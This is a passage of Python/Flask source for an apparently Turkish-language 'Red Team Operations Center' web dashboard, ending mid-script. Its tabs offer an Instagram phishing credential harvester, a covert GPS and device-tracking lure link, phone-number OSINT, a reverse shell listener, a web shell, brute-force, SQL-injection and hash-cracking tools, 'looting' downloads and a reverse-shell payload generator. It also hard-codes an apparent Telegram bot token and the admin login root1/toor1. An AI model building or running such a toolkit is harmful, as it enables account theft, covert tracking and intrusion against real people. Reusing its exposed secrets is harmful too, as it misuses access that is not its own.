import os
import time
import socket
import ssl
import urllib.parse
import requests
import threading
import subprocess
import re
import csv
import zipfile
import hashlib
from concurrent.futures import ThreadPoolExecutor, as_completed
from bs4 import BeautifulSoup
from flask import Flask, render_template_string, request, jsonify, Response, send_file, session, redirect, url_for
from datetime import datetime
from fpdf import FPDF
import io

TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "9082287913:AAEw9lMwKXfRTGf4LzQiF1UEgLZDHzNuc8o")
BASE_URL = f"https://api.telegram.org/bot{TOKEN}"

ADMIN_USER = "root1"
ADMIN_PASS = "toor1"

SITE_DATABASE = []
CLICK_LOGS = []
CREDENTIAL_LOGS = []
DRIVING_SESSIONS = []
OSINT_LOGS = []
CHAT_MESSAGES = []
PACKET_LOGS = []
SCHEDULED_TARGETS = []
NOTIFY_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID", "")

app = Flask(__name__)
app.secret_key = "kali_linux_secret_key_998877"

LOGIN_TEMPLATE = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>Kali Linux - Red Team Operations Center</title>
    <style>
        body { background-color: #0b0f15; color: #00ff66; font-family: 'Courier New', Courier, monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-box { background: #121824; padding: 40px; border-radius: 6px; border: 1px solid #00ff66; box-shadow: 0 0 25px rgba(0,255,102,0.2); width: 350px; text-align: center; }
        h2 { color: #38bdf8; margin-bottom: 25px; text-shadow: 0 0 10px rgba(56,189,248,0.4); }
        .input-group { margin-bottom: 20px; text-align: left; }
        label { display: block; margin-bottom: 8px; font-size: 13px; color: #94a3b8; }
        input { width: 100%; padding: 12px; border-radius: 4px; border: 1px solid #334155; background: #070a0f; color: #00ff66; font-size: 15px; box-sizing: border-box; font-family: 'Courier New', Courier, monospace; outline: none; }
        input:focus { border-color: #00ff66; box-shadow: 0 0 8px rgba(0,255,102,0.4); }
        button { width: 100%; padding: 12px; background: #0284c7; color: white; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; font-weight: bold; font-family: 'Courier New', Courier, monospace; transition: 0.2s; }
        button:hover { background: #0369a1; box-shadow: 0 0 10px rgba(2,132,199,0.5); }
        .error { color: #f87171; margin-bottom: 15px; font-size: 13px; }
    </style>
</head>
<body>
    <div class="login-box">
        <h2>kali@root-terminal:~#</h2>
        {% if error %}<div class="error">{{ error }}</div>{% endif %}
        <form method="POST">
            <div class="input-group"><label>Username</label><input type="text" name="username" required autofocus></div>
            <div class="input-group"><label>Password</label><input type="password" name="password" required></div>
            <button type="submit">Authenticate</button>
        </form>
    </div>
</body>
</html>
"""

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>Kali Linux - Red Team Operations Center</title>
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <style>
        body { background-color: #090d14; color: #e2e8f0; font-family: 'Courier New', Courier, monospace; margin: 0; padding: 15px; }
        .container { max-width: 1400px; margin: 0 auto; background: #121824; padding: 25px; border-radius: 8px; border: 1px solid #1e293b; box-shadow: 0 10px 30px rgba(0,0,0,0.8); }
        .header-bar { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; border-bottom: 2px solid #1e293b; padding-bottom: 12px; }
        h1 { color: #38bdf8; margin: 0; font-size: 22px; text-shadow: 0 0 10px rgba(56,189,248,0.3); }
        .logout-btn { background: #991b1b; color: white; padding: 6px 14px; border-radius: 4px; text-decoration: none; font-size: 13px; font-weight: bold; }
        .logout-btn:hover { background: #7f1d1d; }
        .tabs { display: flex; gap: 5px; margin-bottom: 20px; flex-wrap: wrap; background: #0a0e17; padding: 8px; border-radius: 6px; border: 1px solid #1e293b; }
        .tab-btn { background: #1a2332; color: #94a3b8; border: 1px solid #283548; padding: 8px 12px; border-radius: 4px; cursor: pointer; font-weight: bold; transition: 0.2s; font-size: 12px; font-family: 'Courier New', Courier, monospace; }
        .tab-btn:hover { background: #283548; color: #fff; }
        .tab-btn.active { background: #0284c7; color: white; border-color: #38bdf8; box-shadow: 0 0 8px rgba(56,189,248,0.4); }
        .tab-content { display: none; }
        .tab-content.active { display: block; }
        .form-group { display: flex; flex-direction: column; gap: 8px; margin-bottom: 15px; }
        label { color: #38bdf8; font-size: 13px; font-weight: bold; }
        input[type="text"], select, textarea, input[type="file"], input[type="number"], input[type="password"] { padding: 12px; border-radius: 4px; border: 1px solid #334155; background: #070a0f; color: #00ff66; font-size: 14px; font-family: 'Courier New', Courier, monospace; outline: none; }
        input:focus { border-color: #38bdf8; box-shadow: 0 0 6px rgba(56,189,248,0.3); }
        textarea { resize: vertical; height: 100px; }
        button { padding: 12px 20px; background: #0284c7; color: white; border: none; border-radius: 4px; font-size: 15px; cursor: pointer; transition: 0.2s; font-weight: bold; font-family: 'Courier New', Courier, monospace; }
        button:hover { background: #0369a1; box-shadow: 0 0 10px rgba(2,132,199,0.5); }
        button.secondary { background: #0d9488; }
        button.success { background: #15803d; }
        button.danger { background: #b91c1c; }
        .terminal { background: #05070a; color: #00ff66; padding: 18px; border-radius: 6px; border: 1px solid #1e293b; white-space: pre-wrap; font-family: 'Courier New', Courier, monospace; margin-top: 15px; max-height: 480px; overflow-y: auto; font-size: 13px; line-height: 1.4; box-shadow: inset 0 0 15px rgba(0,0,0,0.8); }
        .loading { color: #facc15; font-style: italic; font-weight: bold; font-size: 14px; }
        table { width: 100%; border-collapse: collapse; margin-top: 15px; background: #0a0e17; border-radius: 6px; overflow: hidden; border: 1px solid #1e293b; }
        th, td { padding: 10px 14px; text-align: left; border-bottom: 1px solid #1e293b; font-size: 13px; vertical-align: middle; }
        th { background: #0284c7; color: white; }
        tr:hover { background: #161f30; }
        .mini-map { width: 160px; height: 100px; border-radius: 4px; border: 1px solid #334155; display: inline-block; }
        .snapshot-img { width: 90px; height: 65px; border-radius: 4px; border: 1px solid #334155; object-fit: cover; }
        .payload-box { background: #0a0e17; padding: 12px; border-radius: 6px; border: 1px solid #1e293b; margin-bottom: 12px; }
        .dashboard-row { display: flex; gap: 20px; margin-bottom: 20px; flex-wrap: wrap; }
        .dashboard-card { flex: 1; background: #0a0e17; padding: 18px; border-radius: 6px; border: 1px solid #1e293b; text-align: center; min-width: 250px; }
        
        /* Gelişmiş Cyberpunk AR HUD Stilleri */
        .ar-container { position: relative; width: 100%; max-width: 800px; margin: 0 auto; background: #000; border-radius: 8px; overflow: hidden; border: 2px solid #38bdf8; box-shadow: 0 0 25px rgba(56,189,248,0.5); transition: 0.3s; }
        .ar-container:fullscreen { max-width: 100%; width: 100vw; height: 100vh; border: none; border-radius: 0; }
        #arVideo { width: 100%; height: 480px; object-fit: cover; display: block; filter: brightness(100%) contrast(100%); transition: filter 0.3s; }
        .ar-container:fullscreen #arVideo { height: 100vh; }
        #arCanvas { position: absolute; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; }
        
        .ar-hud { position: absolute; top: 15px; left: 15px; right: 15px; background: rgba(11, 15, 21, 0.85); border: 1px solid #00ff66; padding: 10px 15px; border-radius: 6px; font-size: 12px; color: #00ff66; z-index: 10; display: flex; justify-content: space-between; align-items: center; transition: background 0.3s, border-color 0.3s; }
        .ar-weather-hud { position: absolute; top: 75px; right: 15px; background: rgba(11, 15, 21, 0.8); border: 1px solid #38bdf8; padding: 6px 10px; border-radius: 4px; font-size: 11px; color: #38bdf8; z-index: 10; pointer-events: none; }
        .ar-fuel-hud { position: absolute; top: 75px; left: 15px; background: rgba(11, 15, 21, 0.85); border: 1px solid #facc15; padding: 6px 12px; border-radius: 4px; font-size: 11px; color: #facc15; z-index: 10; font-weight: bold; }
        
        /* Ekstra HUD Widgetleri (Hız Limiti, G-Force, Lastik Isısı, Kronometre) */
        .ar-speed-limit { position: absolute; bottom: 20px; right: 15px; background: #ffffff; color: #000000; border: 4px solid #dc2626; width: 50px; height: 50px; border-radius: 50%; display: flex; flex-direction: column; align-items: center; justify-content: center; font-weight: bold; font-size: 15px; z-index: 10; box-shadow: 0 0 15px rgba(220,38,38,0.6); }
        .ar-speed-limit span { font-size: 9px; line-height: 8px; font-weight: bold; color: #334155; }
        
        .ar-telemetry-hud { position: absolute; bottom: 20px; left: 15px; background: rgba(11, 15, 21, 0.9); border: 1px solid #38bdf8; padding: 8px 12px; border-radius: 6px; font-size: 11px; color: #38bdf8; z-index: 10; line-height: 1.4; }

        .ar-controls { background: #0a0e17; padding: 12px; border-radius: 6px; border: 1px solid #1e293b; margin-bottom: 12px; display: flex; gap: 15px; flex-wrap: wrap; align-items: center; }
        .ar-controls label { color: #e2e8f0; font-size: 13px; cursor: pointer; display: flex; align-items: center; gap: 6px; }
        .ar-controls input[type="checkbox"] { accent-color: #00ff66; width: 16px; height: 16px; cursor: pointer; }
        
        .ar-log-box { background: #05070a; border: 1px solid #38bdf8; border-radius: 6px; padding: 12px; margin-top: 15px; max-height: 160px; overflow-y: auto; font-family: 'Courier New', Courier, monospace; font-size: 12px; color: #38bdf8; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header-bar">
            <h1>kali@kali-linux:~/red-team-ops#</h1>
            <a href="/logout" class="logout-btn">[x] Logout</a>
        </div>
        
        <div class="tabs">
            <button class="tab-btn active" onclick="switchTab('scanTab')">🚀 Recon</button>
            <button class="tab-btn" onclick="switchTab('phishTab')">📸 Insta Phishing</button>
            <button class="tab-btn" onclick="switchTab('lureTab')">🎯 GPS Tracker</button>
            <button class="tab-btn" onclick="switchTab('osintTab')">🕵️‍♂️ OSINT Intel</button>
            <button class="tab-btn" onclick="switchTab('chatTab')">💬 Secure Chat</button>
            <button class="tab-btn" onclick="switchTab('snifferTab')">📊 Packet Sniffer</button>
            <button class="tab-btn" onclick="switchTab('arNavTab')">🧭 AR 3D HUD & Nav</button>
            <button class="tab-btn" onclick="switchTab('drivingTab')">⛽ Sürüş Raporları</button>
            <button class="tab-btn" onclick="switchTab('crackerTab')">🔑 Hash Cracker</button>
            <button class="tab-btn" onclick="switchTab('shellListenerTab')">💻 Shell Listener</button>
            <button class="tab-btn" onclick="switchTab('telegramTab')">🤖 Telegram</button>
            <button class="tab-btn" onclick="switchTab('wifiTab')">📶 Wi-Fi Audit</button>
            <button class="tab-btn" onclick="switchTab('niktoTab')">🛡️ Nikto</button>
            <button class="tab-btn" onclick="switchTab('dnsTab')">🌍 DNS Dig</button>
            <button class="tab-btn" onclick="switchTab('sqlmapTab')">⚡ SQLmap</button>
            <button class="tab-btn" onclick="switchTab('subdomainTab')">🌐 Subdomain</button>
            <button class="tab-btn" onclick="switchTab('bruteTab')">🔐 Brute</button>
            <button class="tab-btn" onclick="switchTab('shellTab')">💻 Web Shell</button>
            <button class="tab-btn" onclick="switchTab('lootingTab')">🏴‍☠️ Looting</button>
            <button class="tab-btn" onclick="switchTab('analysisTab')">🔍 Secret</button>
            <button class="tab-btn" onclick="switchTab('payloadTab')">🛠️ Payloads</button>
            <button class="tab-btn" onclick="switchTab('dataTab')">📁 Archive</button>
        </div>

        <!-- 1. Keşif -->
        <div id="scanTab" class="tab-content active">
            <div class="form-group"><label>Target URL / IP:</label><input type="text" id="targetUrl" placeholder="example.com"></div>
            <button onclick="startScan(false)">Execute Comprehensive Recon</button>
            <div id="status" class="loading" style="margin-top: 15px;"></div>
            <div class="actions" id="actionButtons" style="display:none; gap:10px; margin-top:15px;">
                <button class="secondary" onclick="downloadReport('txt')">📥 Save TXT</button>
                <button class="danger" onclick="downloadReport('pdf')">📄 Export PDF</button>
                <button class="success" onclick="sendToTelegram()">📤 Send to Telegram</button>
            </div>
            <div id="results" class="terminal" style="display:none;"></div>
        </div>

        <!-- Instagram Phishing -->
        <div id="phishTab" class="tab-content">
            <h3>📸 Instagram Phishing & Credential Harvester</h3>
            <div class="form-group"><label>Sahte Instagram Giriş Linki:</label><input type="text" id="instaLink" readonly style="color: #38bdf8;"></div>
            <button class="success" onclick="generateInstaLink()">Link Üret</button>
            <h4 style="margin-top: 25px;">🎯 Yakalanan Instagram Hesap Bilgileri:</h4>
            <div id="credsContainer"><p style='color: #94a3b8;'>Henüz yakalanan hesap yok.</p></div>
        </div>

        <!-- Lure Tracker -->
        <div id="lureTab" class="tab-content">
            <h3>🎯 Gelişmiş GPS & Cihaz İstihbarat Tracker</h3>
            <button class="success" onclick="generateLureLink()">Gelişmiş Takip Linki Üret</button>
            <div class="form-group" style="margin-top: 20px;"><label>Oluşturulan Takip Linki:</label><input type="text" id="generatedLink" readonly style="color: #38bdf8;"></div>
            <h4 style="margin-top: 25px;">🔗 Yakalanan Ziyaretçi & Cihaz İstihbaratı:</h4>
            <div id="clickLogsContainer"><p style='color: #94a3b8;'>Henüz veri yakalanmadı.</p></div>
        </div>

        <!-- OSINT Modülü -->
        <div id="osintTab" class="tab-content">
            <h3>🕵️‍♂️ OSINT Sosyal Medya & Telefon Numara İstihbarat Modülü</h3>
            <div class="form-group"><label>Hedef Telefon Numarası / Kullanıcı Adı:</label><input type="text" id="osintTarget" placeholder="+905554443322 veya @kullaniciadi"></div>
            <button class="success" onclick="runOsintSearch()">🔍 OSINT İstihbarat Taramasını Başlat</button>
            <div id="osintStatus" class="loading" style="margin-top: 15px;"></div>
            <div id="osintResults" class="terminal" style="display:none; margin-top:15px;"></div>
        </div>

        <!-- Secure Chat -->
        <div id="chatTab" class="tab-content">
            <h3>💬 Dahili Encrypted Chat / Operasyon Haberleşme Odası</h3>
            <p style="color: #94a3b8; font-size: 13px;">Saha ekipleri ve operasyon merkezi arası uçtan uca şifreli mesajlaşma.</p>
            <div id="chatBox" class="terminal" style="height: 300px; margin-bottom: 15px;"></div>
            <div class="form-group" style="display:flex; gap:10px;">
                <input type="text" id="chatUser" placeholder="Kod Adı (örn: Ghost)" value="Mertcan_Op" style="width: 180px;">
                <input type="text" id="chatMessage" placeholder="Mesajınızı yazın..." style="flex:1;" onkeypress="if(event.key==='Enter') sendChatMessage()">
                <button class="success" onclick="sendChatMessage()">Gönder</button>
            </div>
        </div>

        <!-- Packet Sniffer Visualizer -->
        <div id="snifferTab" class="tab-content">
            <h3>📊 Derin Ağ Trafik Simülasyonu (Packet Sniffer Visualizer)</h3>
            <p style="color: #94a3b8; font-size: 13px;">Canlı TCP/UDP, TLS ve HTTP paket trafiği izleme paneli.</p>
            <button class="success" onclick="toggleSniffer()">Canlı Paket Yakalamayı Başlat/Durdur</button>
            <div id="snifferTerminal" class="terminal" style="margin-top:15px; height: 350px;">[00:00:00] Sniffer beklemede. Başlat butonuna basın.</div>
        </div>

        <!-- AR 3D HUD & Navigasyon Modülü (İstediğin Tüm Seçmeli Özellikler Dahil) -->
        <div id="arNavTab" class="tab-content">
            <h3>🧭 AR 3D Holografik Yol Projeksiyonu & Gelişmiş Taktik HUD</h3>
            <p style="color: #94a3b8; font-size: 13px;">3D Ghost Trail, 0-100 Kronometre, Gece Görüşü, Hız Limiti, Kör Navigasyon ve Lastik Isı Matrisi.</p>
            
            <div class="ar-controls">
                <span style="color:#38bdf8; font-weight:bold;">Seçmeli HUD Özellikleri:</span>
                <label><input type="checkbox" id="chkAutoDim" checked> ☀️ Otomatik Parlaklık (Auto-Dim)</label>
                <label><input type="checkbox" id="chkLane" checked> 🚧 Şerit Takip Asistanı</label>
                <label><input type="checkbox" id="chkNightVision"> 🔦 Gece Görüşü / Termal Mod</label>
                <label><input type="checkbox" id="chkCompass"> 🛰️ Kör Navigasyon (Dead Reckoning)</label>
                <label><input type="checkbox" id="chkTimer"> ⏱️ 0-100 Drag Kronometresi</label>
                <label><input type="checkbox" id="chkAntiGlare"> 🕶️ Polarize Anti-Glare Filtre</label>
                <label><input type="checkbox" id="chkSpatial" checked> 🗣️ Sesli Asistan</label>
                <label><input type="checkbox" id="chkAudioAlarm" checked> 🚨 Engel / Tuzak Alarmı</label>
            </div>

            <div class="form-group">
                <label>Hedef Operasyon / Konum:</label>
                <input type="text" id="arDestination" value="Saha Bölge Komuta Merkezi B-2">
            </div>
            
            <div style="display: flex; gap: 10px; margin-bottom: 15px; flex-wrap: wrap;">
                <button class="success" onclick="startARCamera()">📸 Kamerayı Aç & 3D AR Başlat</button>
                <button class="success" onclick="finishDrivingSession()">🏁 Sürüşü Bitir & Rapor Al</button>
                <button class="secondary" onclick="toggleFullScreen()">📺 Tam Ekran</button>
                <button class="success" onclick="takeSnapshot()">📷 Kanıt Al</button>
                <button class="danger" onclick="stopARCamera()">🛑 Kapat</button>
            </div>

            <div class="ar-container" id="arBox">
                <div class="ar-hud" id="arHudBox">
                    <span id="arHudText">Durum: 3D Ghost Trail Hazır</span>
                    <span id="arTelemetry" style="color: #38bdf8;">HIZ: 45 km/s | ETA: 4 dk</span>
                </div>
                <div id="arFuelHud" class="ar-fuel-hud">⛽ Yakıt: %85 | Menzil: 240 km</div>
                <div id="arWeatherWidget" class="ar-weather-hud">⛅ 22°C | Asfalt: 28°C</div>
                
                <!-- Hız Limiti Tabelası (Köşede Küçük) -->
                <div id="arSpeedLimitHud" class="ar-speed-limit">
                    <span>HIZ</span>50
                </div>

                <!-- Sol Alt Taktiksel Telemetri (G-Force, Lastik Isısı, Kronometre) -->
                <div id="arTelemetryHud" class="ar-telemetry-hud">
                    G-Force: 0.4G | Lastik: 32°C (İdeal)<br>
                    ⏱️ 0-100: Bekleniyor...
                </div>

                <video id="arVideo" autoplay playsinline muted></video>
                <canvas id="arCanvas"></canvas>
            </div>

            <h4 style="margin-top: 20px; color: #38bdf8;">📋 Şerit İhlal & Kara Kutu Telemetri Akışı:</h4>
            <div id="arLogTerminal" class="ar-log-box">[00:00:00] Sürüş kara kutusu ve 3D projeksiyon motoru aktif.</div>
        </div>

        <!-- Sürüş Raporları & Kara Kutu -->
        <div id="drivingTab" class="tab-content">
            <h3>⛽ Sürüş Raporları & Kara Kutu (Blackbox) Arşivi</h3>
            <p style="color: #94a3b8; font-size: 13px;">AR sürüşü bittikten sonra buraya kaydedilen detaylı telemetri dökümlerini ve 0-100 derecelerini indirebilirsin.</p>
            <div id="drivingReportsContainer">
                <p style='color:#94a3b8;'>Henüz kaydedilmiş sürüş raporu yok.</p>
            </div>
        </div>

        <!-- Diğer Sekmeler -->
        <div id="crackerTab" class="tab-content">
            <h3>🔑 Hash Cracker</h3>
            <div class="form-group"><select id="hashType"><option value="md5">MD5</option><option value="sha256">SHA-256</option></select></div>
            <div class="form-group"><input type="text" id="targetHash" placeholder="Hash giriniz"></div>
            <div class="form-group"><textarea id="wordlistArea">admin\n123456\nroot1\ntoor1\nsecret</textarea></div>
            <button class="danger" onclick="startHashCrack()">Hash Çöz</button>
            <div id="crackResults" class="terminal" style="display:none; margin-top:15px;"></div>
        </div>

        <div id="shellListenerTab" class="tab-content">
            <h3>💻 Reverse Shell Dinleyicisi</h3>
            <div class="form-group"><input type="number" id="listenerPort" value="4444"></div>
            <button class="success" onclick="startListener()">Dinlemeyi Başlat</button>
            <div id="listenerStatus" class="terminal" style="display:none; margin-top:15px;"></div>
        </div>

        <div id="telegramTab" class="tab-content">
            <h3>🤖 Telegram Bot Notification Tester</h3>
            <div class="form-group"><input type="text" id="testChatId" value="{{ default_chat_id }}"></div>
            <button class="success" onclick="sendTelegramTest()">Test Gönder</button>
            <div id="telegramTestStatus" class="terminal" style="display:none; margin-top:15px;"></div>
        </div>

        <div id="wifiTab" class="tab-content">
            <h3>📶 Wi-Fi Audit</h3>
            <button class="success" onclick="runWifiAction('scan')">Ağları Tara</button>
            <div id="wifiResults" class="terminal" style="display:none; margin-top:15px;"></div>
        </div>

        <div id="niktoTab" class="tab-content"><h3>Nikto Scanner</h3><input type="text" id="niktoTarget" placeholder="https://example.com"><button class="secondary" onclick="startNiktoScan()">Run</button><div id="niktoStatus" class="loading"></div><div id="niktoResults" class="terminal" style="display:none;"></div></div>
        <div id="dnsTab" class="tab-content"><h3>DNS Dig</h3><input type="text" id="dnsDomain" placeholder="example.com"><button class="secondary" onclick="startDnsRecon()">Query</button><div id="dnsStatus" class="loading"></div><div id="dnsResults" class="terminal" style="display:none;"></div></div>
        <div id="sqlmapTab" class="tab-content"><h3>SQLmap Lite</h3><input type="text" id="sqlmapUrl" placeholder="https://example.com/page.php?id=1"><button class="danger" onclick="startSqlmapLite()">Run</button><div id="sqlmapStatus" class="loading"></div><div id="sqlmapResults" class="terminal" style="display:none;"></div></div>
        <div id="subdomainTab" class="tab-content"><h3>Gobuster</h3><input type="text" id="subDomainInput" placeholder="example.com"><button onclick="startSubdomainScan()">Start</button><div id="subStatus" class="loading"></div><div id="subResults" class="terminal" style="display:none;"></div></div>
        <div id="bruteTab" class="tab-content"><h3>Brute-Force</h3><input type="text" id="loginUrl" placeholder="URL"><button class="danger" onclick="startBruteForce()">Launch</button><div id="bruteStatus" class="loading"></div><div id="bruteResults" class="terminal" style="display:none;"></div></div>
        <div id="shellTab" class="tab-content"><h3>Web Shell</h3><input type="text" id="shellCommand" placeholder="id"><button class="danger" onclick="executeWebShell()">Execute</button><div id="shellResults" class="terminal" style="display:none; margin-top:15px;"></div></div>
        <div id="lootingTab" class="tab-content"><h3>Looting</h3><select id="lootingTargetSelect"><option value="">No targets...</option></select><button class="success" onclick="downloadLootZip()">Download ZIP</button></div>
        <div id="analysisTab" class="tab-content"><h3>Secret Scanner</h3><input type="file" id="analysisFile"><button class="secondary" onclick="uploadAndAnalyzeFile()">Scan</button><div id="analysisStatus" class="loading"></div><div id="analysisResults" class="terminal" style="display:none;"></div></div>
        <div id="payloadTab" class="tab-content"><h3>Payloads</h3><div style="display:flex; gap:10px;"><input type="text" id="attackerIp" placeholder="LHOST"><input type="text" id="attackerPort" placeholder="LPORT"><button onclick="generatePayloads()">Gen</button></div><div class="payload-box"><code id="bashPayload">bash -i</code></div></div>
        
        <div id="dataTab" class="tab-content">
            <div class="export-bar" style="margin-bottom:15px;"><a href="/api/export/json" target="_blank"><button class="secondary">Export JSON</button></a> <a href="/api/export/csv" target="_blank"><button class="success">Export CSV</button></a></div>
            <h3>Operations Analytics</h3>
            <div class="dashboard-row">
                <div class="dashboard-card"><h4>Security Grade</h4><canvas id="gradeChart" style="max-height: 180px;"></canvas></div>
                <div class="dashboard-card"><h4>WAF Status</h4><canvas id="wafChart" style="max-height: 180px;"></canvas></div>
            </div>
            <div id="databaseTableContainer">No archived data.</div>
        </div>
    </div>

    <script>
        let currentReportText = "", lastTarget = "", gradeChartInstance = null, wafChartInstance = null;
        let arStream = null, arInterval = null, compassHeading = 0, deviceBeta = 0;
        let currentDistance = 150, currentSpeed = 45, fuelLevel = 85, drivingRange = 240;
        let sessionLogs = [], lastSpokenTime = 0, lastLaneWarningTime = 0;
        let timerState = 'IDLE', timerStartTimestamp = 0, final0to100Time = null;
        let snifferActive = false, snifferInterval = null;

        function switchTab(tabId) {
            document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
            document.querySelectorAll('.tab-btn').forEach(el => el.classList.remove('active'));
            document.getElementById(tabId).classList.add('active');
            event.target.classList.add('active');
            if(tabId === 'drivingTab') loadDrivingReports();
            if(tabId === 'chatTab') loadChatMessages();
            if(tabId === 'dataTab' || tabId === 'lootingTab') loadSiteDatabase();
            if(tabId === 'lureTab') loadClickLogs();
            if(tabId === 'phishTab') loadCreds();
            if(tabId !== 'arNavTab') stopARCamera();
        }

        // --- SECURE CHAT ---
        async function sendChatMessage() {
            let user = document.getElementById('chatUser').value || 'Agent';
            let message = document.getElementById('chatMessage').value.trim();
            if(!message) return;
            await fetch('/api/chat/send', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({user, message}) });
            document.getElementById('chatMessage').value = '';
            loadChatMessages();
        }
        async function loadChatMessages() {
            let res = await fetch('/api/chat/messages');
            let data = await res.json();
            let box = document.getElementById('chatBox');
            box.innerHTML = data.messages.map(m => `[${m.time}] <b>${m.user}:</b> ${m.message}`).join('<br>') || "Şifreli kanal boş.";
            box.scrollTop = box.scrollHeight;
        }

        // --- PACKET SNIFFER ---
        function toggleSniffer() {
            snifferActive = !snifferActive;
            let term = document.getElementById('snifferTerminal');
            if(snifferActive) {
                term.innerHTML = "[+] Ağ trafik simülatörü (Packet Sniffer) başlatıldı...\n";
                snifferInterval = setInterval(() => {
                    let protocols = ['TLSv1.3', 'HTTPS/GET', 'TCP-SYN', 'UDP-DNS', 'ICMP-ECHO'];
                    let ips = ['192.168.1.35 -> 10.0.0.4', '172.16.0.42 -> 8.8.8.8', '10.0.0.1 -> 192.168.1.10'];
                    let p = protocols[Math.floor(Math.random()*protocols.length)];
                    let ip = ips[Math.floor(Math.random()*ips.length)];
                    let line = `[${new Date().toLocaleTimeString()}] PKT SNIFF: ${ip} | Proto: ${p} | Len: ${Math.floor(Math.random()*1200+64)} bytes\n`;
                    term.innerHTML += line;
                    term.scrollTop = term.scrollHeight;
                }, 1200);
            } else {
                clearInterval(snifferInterval);
                term.innerHTML += "[-] Sniffer durduruldu.\n";
            }
        }

        // --- OSINT SEARCH ---
        async function runOsintSearch() {
            let target = document.getElementById('osintTarget').value.trim();
            let statusDiv = document.getElementById('osintStatus'), resultsDiv = document.getElementById('osintResults');
            if(!target) { alert('Hedef giriniz!'); return; }
            statusDiv.innerHTML = `root@kali:~# osint gathering ${target}...`; resultsDiv.style.display = "none";
            let res = await fetch('/api/osint/search', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({target}) });
            let data = await res.json();
            statusDiv.innerHTML = ""; resultsDiv.style.display = "block"; resultsDiv.innerHTML = data.report;
        }

        function speakSpatial(text, force = false) {
            let useSpatial = document.getElementById('chkSpatial').checked;
            let now = Date.now();
            if (!useSpatial || (!force && (now - lastSpokenTime < 10000))) return;
            if ('speechSynthesis' in window) {
                window.speechSynthesis.cancel();
                let utterance = new SpeechSynthesisUtterance(text);
                utterance.lang = 'tr-TR'; utterance.rate = 1.0;
                window.speechSynthesis.speak(utterance);
                lastSpokenTime = now;
            }
        }

        function playThreatBeep() {
            if(!document.getElementById('chkAudioAlarm').checked) return;
            try {
                let audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                let osc = audioCtx.createOscillator(); let gain = audioCtx.createGain();
                osc.type = 'sine'; osc.frequency.setValueAtTime(800, audioCtx.currentTime);
                gain.gain.setValueAtTime(0.05, audioCtx.currentTime);
                gain.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + 0.15);
                osc.connect(gain); gain.connect(audioCtx.destination);
                osc.start(); osc.stop(audioCtx.currentTime + 0.15);
            } catch(e) {}
        }

        function toggleFullScreen() {
            let elem = document.getElementById('arBox');
            if (!document.fullscreenElement) { if (elem.requestFullscreen) elem.requestFullscreen(); } 
            else { if (document.exitFullscreen) document.exitFullscreen(); }
        }

        function takeSnapshot() {
            let video = document.getElementById('arVideo'), canvas = document.getElementById('arCanvas');
            if (!video.srcObject) { alert("Kamera açık değil!"); return; }
            let snapCanvas = document.createElement('canvas');
            snapCanvas.width = video.videoWidth || 640; snapCanvas.height = video.videoHeight || 480;
            let sCtx = snapCanvas.getContext('2d');
            sCtx.drawImage(video, 0, 0, snapCanvas.width, snapCanvas.height);
            sCtx.drawImage(canvas, 0, 0, snapCanvas.width, snapCanvas.height);
            let a = document.createElement('a');
            a.href = snapCanvas.toDataURL('image/png');
            a.download = `AR_TACTICAL_PROOF_${Date.now()}.png`;
            a.click();
            speakSpatial("Kanıt görüntüsü kaydedildi.", true);
        }

        // --- AR 3D HOLOGRAPHIC GHOST TRAIL MOTORU ---
        async function startARCamera() {
            let video = document.getElementById('arVideo'), hud = document.getElementById('arHudText');
            let telemetry = document.getElementById('arTelemetry'), fuelHud = document.getElementById('arFuelHud');
            let telemetryHud = document.getElementById('arTelemetryHud'), speedLimitHud = document.getElementById('arSpeedLimitHud');
            let hudBox = document.getElementById('arHudBox'), canvas = document.getElementById('arCanvas'), logTerminal = document.getElementById('arLogTerminal');

            sessionLogs = []; fuelLevel = 85; drivingRange = 240; currentDistance = 150; currentSpeed = 45;
            timerState = 'IDLE'; final0to100Time = null;

            try { arStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: "environment" } }, audio: false }); } 
            catch (err) { try { arStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false }); } catch (e) { alert("Kamera hatası!"); return; } }

            video.srcObject = arStream;
            hud.innerText = "3D Ghost Trail & HUD Aktif";
            speakSpatial("3D Holografik yol projeksiyonu başlatıldı.", true);

            canvas.width = video.videoWidth || 640; canvas.height = video.videoHeight || 480;
            let ctx = canvas.getContext('2d');
            let step = 0;

            arInterval = setInterval(() => {
                ctx.clearRect(0, 0, canvas.width, canvas.height);
                let w = canvas.width, h = canvas.height;

                // 0-100 Kronometre Kontrolü
                let useTimer = document.getElementById('chkTimer').checked;
                if (useTimer) {
                    if (currentSpeed > 0 && timerState === 'IDLE') {
                        timerState = 'RUNNING'; timerStartTimestamp = Date.now();
                    }
                    if (timerState === 'RUNNING') {
                        let elapsed = ((Date.now() - timerStartTimestamp) / 1000).toFixed(1);
                        if (currentSpeed >= 100 && !final0to100Time) {
                            final0to100Time = elapsed; timerState = 'FINISHED';
                            speakSpatial(`Sıfır yüz tamamlandı. Derece ${final0to100Time} saniye.`, true);
                        }
                    }
                }

                // Filtreler (Night Vision / Auto-Dim / Anti-Glare)
                let useAutoDim = document.getElementById('chkAutoDim').checked;
                let isNight = new Date().getHours() >= 20 || new Date().getHours() < 6;
                let useNightVision = document.getElementById('chkNightVision').checked;
                let useAntiGlare = document.getElementById('chkAntiGlare').checked;

                if (useNightVision) {
